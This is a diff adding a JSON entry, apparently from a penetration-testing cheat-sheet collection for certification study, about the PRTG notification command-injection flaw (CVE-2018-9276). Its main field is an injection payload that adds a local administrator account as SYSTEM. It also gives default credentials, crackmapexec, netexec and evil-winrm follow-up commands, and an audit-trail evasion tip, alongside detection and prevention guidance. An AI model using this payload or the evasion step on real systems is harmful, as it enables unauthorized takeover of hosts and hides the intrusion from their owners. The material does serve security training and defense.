@@ -1,0 +1,95 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "prtg"
+  ],
+  "tags": [
+    "prtg",
+    "command-injection",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "PRTG Network Monitor",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Notification 'Execute Program' field runs the injected command as SYSTEM",
+      "command": "# Notifications > add > Execute Program, paste into parameter field, click Test"
+    },
+    {
+      "label": "Validate the new local admin over SMB",
+      "command": "sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'"
+    },
+    {
+      "label": "Log in interactively over WinRM",
+      "command": "evil-winrm -i 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'"
+    },
+    {
+      "label": "Validate the new local admin with netexec (nxc) and list shares",
+      "command": "netexec smb <ip> -u <newuser> -p '<newpass>' --shares"
+    }
+  ],
+  "notes": "Default creds prtgadmin:prtgadmin. Validate the new admin with crackmapexec/netexec, then evil-winrm in.",
+  "references": [
+    {
+      "title": "PRTG CVE-2018-9276",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-9276"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "other-apps-defaults",
+      "note": "Try default prtgadmin creds to reach the console.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "prtg-notification-rce",
+  "name": "PRTG - Notification Command Injection (CVE-2018-9276)",
+  "command": "test.txt;net user <newuser> <newpass> /add;net localgroup administrators <newuser> /add",
+  "description": "Authenticated PRTG lets you create a notification that runs a program; the parameter field is command-injectable, so appending shell commands adds a local admin user (PRTG runs as SYSTEM).",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1136.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "PRTG's notification system allows admins to execute programs when alerts fire. The parameter field for the EXE/script notification is unsanitized, enabling OS command injection via semicolons appended after the filename.",
+    "prerequisites": "Valid PRTG admin credentials (default prtgadmin:prtgadmin often unchanged). Access to PRTG web interface. Ability to create/modify notifications and trigger them.",
+    "impact": "OS command execution as PRTG service account (often SYSTEM on Windows). Can create local admin users, install backdoors, run Mimikatz -- full Windows host compromise.",
+    "detection": "PRTG notification creation or modification. Unusual child process from PRTGServer.exe (net.exe, whoami.exe). Windows Security Event 4688 for process creation from PRTG. New local admin account (4720/4732).",
+    "artifacts": "PRTG audit log (notification modified) | Windows Security Event 4688 (net.exe from PRTG) | Windows Event 4720/4732 (new admin user) | EDR: PRTG spawning cmd.exe",
+    "prevention": "Change default PRTG credentials immediately. Restrict PRTG web interface to internal IPs. Apply PRTG patches. Run PRTG service as a non-admin service account. Monitor for new local admin account creation.",
+    "misconfiguration": "PRTG running with default credentials. Service runs as SYSTEM. Notification system allows semicolon-injected OS commands without sanitization.",
+    "vulnerable_config": "# PRTG default\n# Service account: SYSTEM\n# Credentials: prtgadmin:prtgadmin\n# Notification param: 'test.txt;net user admin Pwn3d! /add'\n# No input sanitization",
+    "secure_config": "# Change default credentials immediately\n# Run PRTG as low-privilege service account:\nNew-LocalUser -Name \"prtg_svc\" -Password (ConvertTo-SecureString \"StrongPass!\" -AsPlainText -Force)\n# Alert on Windows Event 4732 (member added to Administrators)",
+    "evasion": "Trigger via legitimate alert threshold rather than Test button to avoid direct admin action in audit trail.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "MITRE T1059",
+      "OWASP A03:2021"
+    ]
+  }
+}
